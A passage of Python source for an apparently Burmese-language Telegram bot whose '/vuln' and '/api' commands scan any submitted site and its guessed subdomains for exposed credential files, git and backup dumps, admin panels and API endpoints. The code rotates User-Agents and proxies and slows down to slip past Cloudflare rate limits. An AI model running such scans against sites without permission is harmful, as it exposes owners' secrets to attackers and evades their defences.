    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    # ── Mobile — Android Chrome ──────────────────────────────────────
    'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.137 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.79 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; RMX3890) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36',
    # ── Mobile — iOS Safari ──────────────────────────────────────────
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    # ── iPad ─────────────────────────────────────────────────────────
    'Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    # ── Opera ─────────────────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
    # ── Brave (Chrome-based) ──────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    # ── Mobile Firefox ───────────────────────────────────────────────
    'Mozilla/5.0 (Android 15; Mobile; rv:138.0) Gecko/138.0 Firefox/138.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0',
    # ── Samsung Internet ─────────────────────────────────────────────
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/125.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36',
]


def _get_headers() -> dict:
    """Rotate User-Agent each call with realistic browser headers."""
    ua = random.choice(_UA_LIST)
    is_mobile = 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua or 'iPad' in ua
    return {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice([
            'en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.5',
            'en-US,en;q=0.9,fr;q=0.8', 'en-US,en;q=0.9,de;q=0.8',
        ]),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        **({"Sec-CH-UA-Mobile": "?1"} if is_mobile else {"Sec-CH-UA-Mobile": "?0"}),
    }


def _get_page_fingerprint(url: str, timeout: int = 6) -> tuple:
    """
    Get (status_code, body_hash, content_length) for baseline comparison.
    Used to detect catch-all pages.
    """
    try:
        resp = requests.get(url, headers=_get_headers(), timeout=timeout,
                            stream=True, allow_redirects=True, verify=False,
                            proxies=proxy_manager.get_proxy())
        status = resp.status_code
        chunk  = b''
        for part in resp.iter_content(1024):
            chunk += part
            if len(chunk) >= 1024: break
        resp.close()
        body_hash = hashlib.md5(chunk[:512]).hexdigest()
        ct_length = int(resp.headers.get('Content-Length', len(chunk)))
        return status, body_hash, ct_length, resp.headers.get('Content-Type','')
    except Exception:
        return 0, '', 0, ''


def _detect_catchall(base_url: str) -> tuple:
    """
    Request a random non-existent path — if it returns 200,
    the server has a catch-all (Cloudflare, custom 404 as 200).
    Returns (is_catchall: bool, baseline_hash: str, baseline_len: int)
    """
    rand_path = '/' + ''.join(random.choices(string.ascii_lowercase, k=16)) + '.html'
    status, body_hash, ct_len, ct = _get_page_fingerprint(base_url.rstrip('/') + rand_path)
    if status == 200:
        return True, body_hash, ct_len   # catch-all confirmed
    return False, '', 0


def _is_fake_200_content(body: bytes, ct: str) -> bool:
    if 'html' not in ct.lower():
        return False
    snippet = body[:800].lower()
    return any(s in snippet for s in _FAKE_SIGS)


def _probe_one(
    base_url: str, path: str, label: str, severity: str,
    catchall: bool, baseline_hash: str, baseline_len: int,
    delay: float = 0.0
) -> dict | None:
    """
    Probe one path — GET + stream.
    Compares against baseline to filter catch-all false positives.
    """
    if delay > 0:
        time.sleep(delay)

    full_url = base_url.rstrip('/') + path
    try:
        resp = requests.get(
            full_url, headers=_get_headers(),
            timeout=8, stream=True,
            allow_redirects=True, verify=False,
            proxies=proxy_manager.get_proxy(),
        )
        status = resp.status_code
        ct     = resp.headers.get('Content-Type', '')

        if status == 200:
            chunk = b''
            for part in resp.iter_content(1024):
                chunk += part
                if len(chunk) >= 1024: break
            resp.close()

            # ── Catch-all filter ──────────────────
            if catchall:
                page_hash = hashlib.md5(chunk[:512]).hexdigest()
                page_len  = int(resp.headers.get('Content-Length', len(chunk)))
                # Same hash or very similar length = catch-all page
                if page_hash == baseline_hash:
                    return None
                if baseline_len > 0 and abs(page_len - baseline_len) < 50:
                    return None

            # ── Fake 200 (custom 404 HTML) ────────
            if _is_fake_200_content(chunk, ct):
                return None

            size = int(resp.headers.get('Content-Length', len(chunk)))
            return {
                "path": path, "full_url": full_url,
                "label": label, "severity": severity,
                "status": 200, "protected": False, "size": size,
            }

        elif status == 403 and severity in ("CRITICAL","HIGH"):
            resp.close()
            # Cloudflare 403 = file might exist but CF blocks it
            cf = 'cloudflare' in resp.headers.get('Server','').lower() or \
                 'cf-ray' in resp.headers
            note = " (CF-blocked)" if cf else ""
            return {
                "path": path, "full_url": full_url,
                "label": label + note, "severity": "MEDIUM",
                "status": 403, "protected": True, "size": 0,
            }

        elif status in (301,302,307,308):
            loc = resp.headers.get('Location','')
            resp.close()
            if severity in ("HIGH","MEDIUM","LOW") and any(
                k in loc for k in ('login','auth','signin','session')
            ):
                return {
                    "path": path, "full_url": full_url,
                    "label": label + " (→ login)",
                    "severity": severity, "status": status,
                    "protected": True, "size": 0,
                }

        else:
            try: resp.close()
            except: pass

    except requests.exceptions.Timeout:
        pass
    except Exception:
        pass
    return None


def _verify_subdomain_real(sub_url: str) -> bool:
    """
    A subdomain is 'real' only if:
    1. DNS resolves OK
    2. HTTP responds (any code)
    3. It has DIFFERENT content than a random path on SAME subdomain
       (i.e. not a Cloudflare/nginx catch-all that mirrors base domain)
    """
    try:
        hostname = urlparse(sub_url).hostname
        socket.gethostbyname(hostname)   # DNS must resolve
    except socket.gaierror:
        return False  # NXDOMAIN = not real

    # Check if it returns anything
    try:
        r = requests.get(sub_url, headers=_get_headers(), timeout=5,
                         proxies=proxy_manager.get_proxy(), allow_redirects=True, verify=False, stream=True)
        r.close()
        code = r.status_code
        if code >= 500:
            return False
    except Exception:
        return False

    # Verify it's NOT a catch-all mirror of the base domain
    is_catchall, _, _ = _detect_catchall(sub_url)
    # Even catch-all subdomains can be real services — just note it
    # We still include them but mark behavior
    return True


def _scan_target_sync(
    target_url: str, delay_per_req: float = 0.3
) -> tuple:
    """Scan one URL with catch-all detection and delays."""
    exposed   = []
    protected = []

    # Detect catch-all first
    catchall, baseline_hash, baseline_len = _detect_catchall(target_url)

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        fmap = {
            ex.submit(
                _probe_one, target_url, path, label, sev,
                catchall, baseline_hash, baseline_len,
                delay_per_req * (i % 5)   # stagger delays 0/0.3/0.6/0.9/1.2s
            ): (path, label, sev)
            for i, (path, label, sev) in enumerate(_VULN_PATHS)
        }
        for fut in concurrent.futures.as_completed(fmap, timeout=120):
            try:
                f = fut.result(timeout=15)
                if f:
                    (protected if f["protected"] else exposed).append(f)
            except Exception:
                pass

    exposed.sort(key=lambda x: _SEV_ORDER.get(x["severity"],9))
    protected.sort(key=lambda x: _SEV_ORDER.get(x["severity"],9))
    return exposed, protected, catchall


def _discover_subdomains_sync(base_url: str, progress_q: list) -> list:
    """
    Discover live subdomains — with real verification (not catch-all mirrors).
    """
    parsed = urlparse(base_url)
    scheme = parsed.scheme
    parts  = parsed.hostname.split('.')
    root   = '.'.join(parts[-2:]) if len(parts) > 2 else parsed.hostname

    progress_q.append(
        f"📡 Subdomain discovery...\n"
        f"Testing `{len(_COMMON_SUBDOMAINS)}` common names on `{root}`"
    )

    live = []

    def check_sub(sub):
        url = f"{scheme}://{sub}.{root}"
        if _verify_subdomain_real(url):
            return url
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(check_sub, sub): sub for sub in _COMMON_SUBDOMAINS}
        for fut in concurrent.futures.as_completed(futures, timeout=40):
            try:
                result = fut.result(timeout=8)
                if result:
                    live.append(result)
            except Exception:
                pass

    return live


def _vuln_scan_sync(url: str, progress_q: list) -> dict:
    """Main orchestrator."""
    # Detect Cloudflare → increase delays
    is_cloudflare = False
    results = {
        "url": url, "findings": [],
        "missing_headers": [], "clickjacking": False,
        "https": url.startswith("https://"),
        "server": "Unknown", "subdomains_found": [],
        "total_scanned": 0, "errors": 0,
        "cloudflare": False,
    }

    # ── Baseline headers ──────────────────────────
    progress_q.append("🔍 Checking security headers...")
    try:
        r0   = requests.get(url, timeout=10, headers=_get_headers(),
                            proxies=proxy_manager.get_proxy(), allow_redirects=True, verify=False)
        hdrs = dict(r0.headers)
        srv  = hdrs.get('Server','Unknown')
        results["server"] = srv[:60]
        is_cloudflare = 'cloudflare' in srv.lower() or 'cf-ray' in hdrs
        results["cloudflare"] = is_cloudflare

        for hdr,(name,sev) in _SEC_HEADERS.items():
            if hdr not in hdrs:
                results["missing_headers"].append((name,hdr,sev))
        if srv and any(c.isdigit() for c in srv):
            results["missing_headers"].append(
                ("Server version leak", f"Server: {srv[:50]}", "LOW"))
        xpb = hdrs.get('X-Powered-By','')
        if xpb:
            results["missing_headers"].append(
                ("Tech disclosure", f"X-Powered-By: {xpb[:40]}", "LOW"))
        has_xfo = 'X-Frame-Options' in hdrs
        has_fa  = 'frame-ancestors' in hdrs.get('Content-Security-Policy','')
        results["clickjacking"] = not has_xfo and not has_fa
    except Exception:
        results["errors"] += 1

    # Cloudflare = slower scan to avoid rate limiting
    req_delay = 0.8 if is_cloudflare else 0.2
    sub_workers = 5 if is_cloudflare else 10

    if is_cloudflare:
        progress_q.append(
            "☁️ *Cloudflare detected*\n"
            "Slower scan mode to avoid rate limiting..."
        )

    # ── Subdomain discovery ───────────────────────
    live_subs = _discover_subdomains_sync(url, progress_q)
    results["subdomains_found"] = live_subs

    if live_subs:
        progress_q.append(
            f"✅ *{len(live_subs)} real subdomains found:*\n"
            + "\n".join(f"  • `{urlparse(s).netloc}`" for s in live_subs[:8])
        )
    else:
        progress_q.append("📭 No live subdomains found")

    # ── Scan each target ──────────────────────────
    all_targets = [url] + live_subs
    for i, target in enumerate(all_targets):
        netloc = urlparse(target).netloc
        progress_q.append(
            f"🔍 Scanning `{netloc}`...\n"
            f"Target `{i+1}/{len(all_targets)}`"
            + (" ☁️ slow mode" if is_cloudflare else "")
        )
        exposed, protected, catchall = _scan_target_sync(target, req_delay)
        results["total_scanned"] += len(_VULN_PATHS)
        if exposed or protected:
            results["findings"].append({
                "target":    target,
                "netloc":    netloc,
                "exposed":   exposed,
                "protected": protected,
                "catchall":  catchall,
            })

    return results


def _format_vuln_report(r: dict) -> str:
    domain = urlparse(r["url"]).netloc
    lines  = []

    total_exp = sum(len(f["exposed"]) for f in r["findings"])
    all_sevs  = [fi["severity"] for f in r["findings"] for fi in f["exposed"]]

    if   "CRITICAL" in all_sevs:                       overall = "🔴 CRITICAL RISK"
    elif "HIGH"     in all_sevs:                       overall = "🟠 HIGH RISK"
    elif "MEDIUM"   in all_sevs or r["clickjacking"]:  overall = "🟡 MEDIUM RISK"
    elif r["missing_headers"]:                         overall = "🔵 LOW RISK"
    else:                                              overall = "✅ CLEAN"

    cf_badge = " ☁️ Cloudflare" if r.get("cloudflare") else ""
    lines += [
        "🛡️ *Vulnerability Scan Report*",
        f"🌐 `{domain}`{cf_badge}",
        f"📊 Risk: *{overall}*",
        f"🔍 Paths: `{r['total_scanned']}` | Issues: `{total_exp}`",
        f"📡 Subdomains: `{len(r['subdomains_found'])}`",
        f"🖥️ Server: `{r['server']}`",
        "",
    ]

    # Subdomains
    if r["subdomains_found"]:
        lines.append("*📡 Live Subdomains:*")
        for s in r["subdomains_found"]:
            lines.append(f"  • {s}")
        lines.append("")

    # HTTPS
    lines.append("*🔐 HTTPS:*")
    lines.append("  ✅ HTTPS enabled" if r["https"] else "  🔴 HTTP only — no encryption!")
    lines.append("")

    # Findings per target
    if r["findings"]:
        for f in r["findings"]:
            if f["exposed"]:
                lines.append(f"*🚨 Exposed — `{f['netloc']}`:*")
                for fi in f["exposed"]:
                    em   = _SEV_EMOJI.get(fi["severity"],"⚪")
                    note = f" `[{fi['status']}]`"
                    lines.append(f"  {em} `{fi['severity']}` — {fi['label']}{note}")
                    lines.append(f"  🔗 {fi['full_url']}")
                lines.append("")
            if f["protected"]:
                lines.append(f"*⚠️ Blocked (403) — `{f['netloc']}`:*")
                for fi in f["protected"][:5]:
                    em = _SEV_EMOJI.get(fi["severity"],"⚪")
                    lines.append(f"  {em} {fi['label']}")
                    lines.append(f"  🔗 {fi['full_url']}")
                lines.append("")
    else:
        lines += ["*✅ No exposed files found*", ""]

    # Clickjacking
    lines.append("*🖼️ Clickjacking:*")
    if r["clickjacking"]:
        lines.append("  🟠 Vulnerable — no X-Frame-Options / frame-ancestors")
    else:
        lines.append("  ✅ Protected")
    lines.append("")

    # Security headers
    if r["missing_headers"]:
        lines.append("*📋 Security Header Issues:*")
        for name, hdr, sev in r["missing_headers"][:8]:
            em = _SEV_EMOJI.get(sev,"⚪")
            if "leak" in name.lower() or "disclosure" in name.lower():
                lines.append(f"  {em} {name}: `{hdr}`")
            else:
                lines.append(f"  {em} Missing *{name}*")
        lines.append("")

    # Cloudflare note
    if r.get("cloudflare"):
        lines += [
            "☁️ *Cloudflare note:*",
            "  Some paths may be hidden behind CF WAF.",
            "  403 results may indicate file exists but CF blocks it.",
            "",
        ]

    lines += ["━━━━━━━━━━━━━━━━━━",
              "⚠️ _Passive scan only — no exploitation_"]
    return "\n".join(lines)


async def cmd_vuln(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/vuln <url> — Passive vuln scanner with CF-aware subdomain discovery."""
    if not context.args:
        await update.effective_message.reply_text(
            "🛡️ *Vulnerability Scanner v4*\n\n"
            "Usage: `/vuln <url>`\n\n"
            "Features:\n"
            "• 📡 Subdomain discovery (DNS verified)\n"
            "• ☁️ Cloudflare detection + slow-mode\n"
            "• 🔍 Catch-all false-positive filter\n"
            "• 🔑 Config / credential leaks\n"
            "• 📁 Git / backup / DB dumps\n"
            "• 🔐 Admin panel detection\n"
            "• 🔗 Full clickable URLs\n\n"
            "_Passive only — no exploitation_",
            parse_mode='Markdown'
        )
        return

    url = context.args[0]
    if not url.startswith('http'):
        url = 'https://' + url

    uid = update.effective_user.id
    allowed, wait_sec = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(
            f"⏱️ `{wait_sec}` seconds စောင့်ပါ",
            parse_mode='Markdown'); return

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(
            f"🚫 `{reason}`", parse_mode='Markdown'); return

    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🛡️ *Vuln Scan v4*\n🌐 `{domain}`\n\n"
        f"• Baseline & catch-all detection\n"
        f"• Subdomain discovery\n"
        f"• Path scanning\n\n_ခဏစောင့်ပါ..._",
        parse_mode='Markdown'
    )

    progress_q: list = []

    async def _prog_loop():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🛡️ *Scanning `{domain}`*\n\n{txt}",
                        parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog_loop())
    try:
        results = await asyncio.to_thread(_vuln_scan_sync, url, progress_q)
    except Exception as e:
        prog.cancel()
        await msg.edit_text(
            f"❌ Scan error: `{type(e).__name__}: {str(e)[:80]}`",
            parse_mode='Markdown'); return
    finally:
        prog.cancel()

    report = _format_vuln_report(results)
    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000] + "\n_...continued_", parse_mode='Markdown')
            await update.effective_message.reply_text(report[4000:], parse_mode='Markdown')
    except Exception:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔌  /api — API ENDPOINT DISCOVERY COMMAND
# ══════════════════════════════════════════════════

async def cmd_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/api <url> — Discover API endpoints, RSS feeds, hidden paths"""
    uid = update.effective_user.id
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/api https://example.com`\n\n"
            "🔍 *Discovery Method 4 ခု:*\n"
            "① HTML source mining _(data-attrs, inline JS)_\n"
            "② JS bundle mining _(fetch/axios/url patterns)_\n"
            "③ robots.txt / sitemap scan\n"
            f"④ `{len(ALL_API_PATHS)}` known paths brute-force\n\n"
            "🔌 *ရှာပေးသောအမျိုးအစားများ:*\n"
            "• REST API (v1/v2/v3)\n"
            "• GraphQL endpoints\n"
            "• WordPress / WooCommerce / Shopify\n"
            "• Auth (JWT, OAuth, Sanctum)\n"
            "• Admin / Dashboard APIs\n"
            "• Mobile / SaaS / Fintech APIs\n"
            "• Swagger / OpenAPI docs\n"
            "• RSS/Atom feeds\n"
            "• CORS detection\n\n"
            "📦 *Result ကို JSON file နဲ့ download ပေးမယ်*",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text("`%ds` စောင့်ပါ" % wait, parse_mode="Markdown")
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).netloc
    msg    = await update.effective_message.reply_text(
        f"🔌 *API Discovery — `{domain}`*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔍 Phase 1: HTML source mining...\n"
        f"📦 Phase 2: JS bundle mining...\n"
        f"🤖 Phase 3: robots.txt scan...\n"
        f"🔌 Phase 4: `{len(ALL_API_PATHS)}` paths brute-force...\n\n"
        f"⏳ ခဏစောင့်ပါ...",
        parse_mode='Markdown'
    )

    progress_q: list = []

    async def _prog_loop():
        while True:
            await asyncio.sleep(4)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🔌 *Scanning `{domain}`*\n\n{txt}",
                        parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog_loop())
    try:
        found = await asyncio.to_thread(
            discover_api_endpoints, url, lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    result    = found   # found is now a dict
    endpoints = result.get("found", [])
    js_mined  = result.get("js_mined", [])
    html_mined= result.get("html_mined", [])
    robots    = result.get("robots", [])
    stats     = result.get("stats", {})

    # ── Summary message ───────────────────────────
    json_apis = [e for e in endpoints if e["type"] in ("JSON_API", "GRAPHQL")]
    xml_feeds = [e for e in endpoints if e["type"] == "XML/RSS"]
    api_docs  = [e for e in endpoints if e["type"] == "API_DOCS"]
    protected = [e for e in endpoints if e["type"] == "PROTECTED"]
    others    = [e for e in endpoints if e["type"] == "OTHER"]
    cors_list = [e for e in endpoints if e.get("cors")]

    all_mined = list(set(js_mined + html_mined + robots))

    if not endpoints and not all_mined:
        await msg.edit_text(
            f"🔌 *API Discovery — `{domain}`*\n\n"
            f"📭 API endpoints မတွေ့ပါ\n"
            f"_(protected or non-standard paths ဖြစ်နိုင်)_\n\n"
            f"🔍 Probed: `{stats.get('total_probed',0)}` paths",
            parse_mode='Markdown'
        )
        return

    report_lines = [
        f"🔌 *API Discovery — `{domain}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"📊 Endpoints: `{len(endpoints)}` | 🔍 Probed: `{stats.get('total_probed',0)}`",
        f"📦 JS mined: `{stats.get('js_urls_found',0)}` | 🌐 HTML mined: `{stats.get('html_urls_found',0)}`",
        "",
    ]

    if json_apis:
        report_lines.append(f"*✅ JSON / GraphQL APIs ({len(json_apis)}):*")
        for e in json_apis[:20]:
            path = urlparse(e["url"]).path or e["url"]
            tag  = " 〔GraphQL〕" if e["type"] == "GRAPHQL" else ""
            cors = " ✦CORS" if e.get("cors") else ""
            prev = e.get("preview","")[:60].replace("\n"," ")
            report_lines.append(f"  🟢 `{path}`{tag}{cors}")
            if prev: report_lines.append(f"     _{prev}_")
        report_lines.append("")

    if xml_feeds:
        report_lines.append(f"*📰 RSS / XML Feeds ({len(xml_feeds)}):*")
        for e in xml_feeds[:10]:
            path = urlparse(e["url"]).path or e["url"]
            report_lines.append(f"  📡 `{path}`")
        report_lines.append("")

    if api_docs:
        report_lines.append(f"*📖 API Docs / Swagger ({len(api_docs)}):*")
        for e in api_docs[:5]:
            path = urlparse(e["url"]).path or e["url"]
            report_lines.append(f"  📘 `{path}`")
        report_lines.append("")

    if protected:
        report_lines.append(f"*🔒 Protected — Exists ({len(protected)}):*")
        for e in protected[:10]:
            path = urlparse(e["url"]).path or e["url"]
            note = f" [{e.get('note',e['status'])}]"
            cors = " ✦CORS" if e.get("cors") else ""
            report_lines.append(f"  🔐 `{path}`{note}{cors}")
        report_lines.append("")

    if all_mined:
        unique_mined = sorted(set(
            urlparse(u).path for u in all_mined if urlparse(u).path
        ))[:20]
        report_lines.append(f"*🕵️ Mined from JS/HTML ({len(all_mined)} total):*")
        for p in unique_mined:
            report_lines.append(f"  🔎 `{p}`")
        report_lines.append("")

    if others:
        report_lines.append(f"*📄 Other ({len(others)}):*")
        for e in others[:5]:
            path = urlparse(e["url"]).path or e["url"]
            report_lines.append(f"  📋 `{path}`")
        report_lines.append("")

    if cors_list:
        report_lines.append(f"*🌍 CORS Enabled ({len(cors_list)}):*")
        for e in cors_list[:5]:
            path = urlparse(e["url"]).path
            report_lines.append(f"  🌐 `{path}` → `{e['cors']}`")
        report_lines.append("")

    report_lines.append("⚠️ _Passive scan only — no exploitation_")

    report_text = "\n".join(report_lines)

    # ── Send text report ──────────────────────────
    try:
        if len(report_text) <= 4000:
            await msg.edit_text(report_text, parse_mode='Markdown')
        else:
            await msg.edit_text(report_text[:4000], parse_mode='Markdown')
            await update.effective_message.reply_text(
                report_text[4000:8000], parse_mode='Markdown')
    except Exception:
        await update.effective_message.reply_text(
            report_text[:4000], parse_mode='Markdown')

    # ── Export full JSON report + send as file ────
    if endpoints or all_mined:
        try:
            safe_domain = re.sub(r'[^\w\-]', '_', domain)
            ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
            json_path   = os.path.join(DOWNLOAD_DIR, f"api_{safe_domain}_{ts}.json")

            export_data = {
                "domain":     domain,
                "scanned_at": datetime.now().isoformat(),
                "stats":      stats,
                "endpoints": [{
                    "url":     e["url"],
                    "type":    e["type"],
                    "status":  e["status"],
                    "cors":    e.get("cors"),
                    "preview": e.get("preview","")[:200],
                    "size_b":  e.get("size_b",0),
                } for e in endpoints],
                "js_mined":   list(set(js_mined)),
                "html_mined": list(set(html_mined)),
                "robots":     robots,
            }

            with open(json_path, 'w', encoding='utf-8') as jf:
                json.dump(export_data, jf, ensure_ascii=False, indent=2)

            cap = (
                f"📦 *API Report — `{domain}`*\n"
                f"✅ `{len(endpoints)}` endpoints | 🕵️ `{len(all_mined)}` mined\n"
                f"🗓 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            )
            with open(json_path, 'rb') as jf:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=jf,
                    filename=f"api_{safe_domain}_{ts}.json",
                    caption=cap,
                    parse_mode='Markdown'
                )
            os.remove(json_path)
        except Exception as e:
            logger.warning("API JSON export error: %s", e)




def download_website(
    base_url: str,
    full_site: bool,
    use_js: bool,
    max_pages: int,
    max_assets: int,
    progress_cb=None,
    resume: bool = False,
) -> tuple:

    domain     = urlparse(base_url).netloc
    safe       = re.sub(r'[^\w\-]','_', domain)
    domain_dir = os.path.join(DOWNLOAD_DIR, safe)
    os.makedirs(domain_dir, exist_ok=True)

    state       = load_resume(base_url) if resume else {"visited":[],"downloaded":[],"assets":[],"stats":{}}
    visited     = set(state["visited"])
    dl_done     = set(state["downloaded"])
    known_assets= set(state["assets"])
    stats = state.get("stats") or {'pages':0,'assets':0,'failed':0,'size_kb':0}

    session = requests.Session()
    session.headers.update(_get_headers())

    # ── Attach proxy to session if available ──────
    _px = proxy_manager.get_proxy()
    if _px:
        session.proxies.update(_px)

    # ── Phase 0: Sitemap discovery ───────────────
    queue: list = [base_url]   # ← FIX: initialize before sitemap section
    if full_site and not resume:
        if progress_cb: progress_cb("🗺️ Sitemap ရှာနေပါတယ်...")
        sitemap_urls = fetch_sitemap(base_url)
        if sitemap_urls:
            stats['sitemap_urls'] = len(sitemap_urls)
            if progress_cb:
                progress_cb("🗺️ Sitemap: `%d` URLs တွေ့ပြီ" % len(sitemap_urls))
            for u in list(sitemap_urls)[:max_pages]:
                if u not in visited and u not in queue:
                    queue.append(u)

    # ── Phase 1: Pages ──────────────────────────
    queue = list(dict.fromkeys(queue))
    queue = [u for u in queue if u not in visited]

    while queue and len(visited) < max_pages:
        url = queue.pop(0)
        if url in visited: continue

        # SSRF check per link
        safe_ok, reason = is_safe_url(url)
        if not safe_ok:
            log_warn(url, f"SSRF blocked: {reason}")
            stats['failed'] += 1
            visited.add(url)
            continue

        visited.add(url)
        html, js_used = fetch_page(url, use_js)
        if html is None:
            stats['failed'] += 1
            continue

        local = safe_local_path(domain_dir, url)
        try:
